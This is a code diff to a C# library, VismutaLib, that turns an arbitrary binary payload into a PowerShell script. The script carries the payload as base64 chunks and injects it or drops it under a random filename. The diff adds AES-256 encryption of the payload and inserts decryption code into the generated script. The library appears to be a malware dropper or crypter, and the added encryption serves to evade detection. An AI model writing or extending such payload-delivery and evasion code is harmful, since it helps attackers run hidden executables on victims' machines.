@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Security.Cryptography;
 using VismutaLib.Properties;
 
 namespace VismutaLib
@@ -13,12 +14,12 @@ namespace VismutaLib
         public const Int32 RandomFilenameLength = 8;
 
         public static String Muta(DeployMethodFlags deployFlags, Byte[] srcBinary, String payloadName,
-            String payloadExt, String payloadArgs)
+            String payloadExt, String payloadArgs, String keyphrase)
         {
             if (srcBinary == null)
                 throw new ArgumentNullException(nameof(srcBinary));
             if (String.IsNullOrWhiteSpace(payloadName))
-                throw new ArgumentNullException(nameof(payloadName));
+                throw new ArgumentException(nameof(payloadName));
             if(payloadExt == null)
                 throw new ArgumentNullException(nameof(payloadExt));
             if(payloadArgs == null)
@@ -26,6 +27,14 @@ namespace VismutaLib
 
             if (!IsValidDeployMethod(deployFlags))
                 throw new InvalidOperationException("Invalid combination of options");
+
+            //Encrypt Payload
+            if (deployFlags.HasFlag(DeployMethodFlags.EncryptPayload))
+            {
+                if(String.IsNullOrWhiteSpace(keyphrase))
+                    throw new ArgumentException(nameof(keyphrase));
+                srcBinary = Encryption.AES256Encrypt(srcBinary, keyphrase);
+            }
 
             String dstShell = String.Empty;
             String execName = GetRandomString(RandomFilenameLength, false);
@@ -42,10 +51,14 @@ namespace VismutaLib
             }
 
             //Deploy Payload
-            dstShell += "[string] $payloadEncoded = \"\"; " + CRLF;
+                dstShell += "[string] $payloadEncoded = \"\"; " + CRLF;
             foreach (String payloadChunk in ChunkString(srcEncoded))
                 dstShell += $"$payloadEncoded += \"{payloadChunk}\"; " + CRLF;
             dstShell += "[byte[]] $payload = [System.Convert]::FromBase64String($payloadEncoded); " + CRLF;
+
+            //Decrypt Payload
+            if (deployFlags.HasFlag(DeployMethodFlags.EncryptPayload))
+                dstShell += Resources.AES256Decrypt.Replace(Environment.NewLine, CRLF) + CRLF;
 
             if (deployFlags.HasFlag(DeployMethodFlags.Inject))
             {
@@ -116,10 +129,6 @@ namespace VismutaLib
                 return false;
             if (flags.HasFlag(DeployMethodFlags.Inject) && flags.HasFlag(DeployMethodFlags.ObfuscateName))
                 return false;
-
-            //Uh.. this isn't implemented yet...
-            if (flags.HasFlag(DeployMethodFlags.EncryptPayload))
-                throw new NotImplementedException("Encryption isn't implemented yet");
 
             return true;
         }
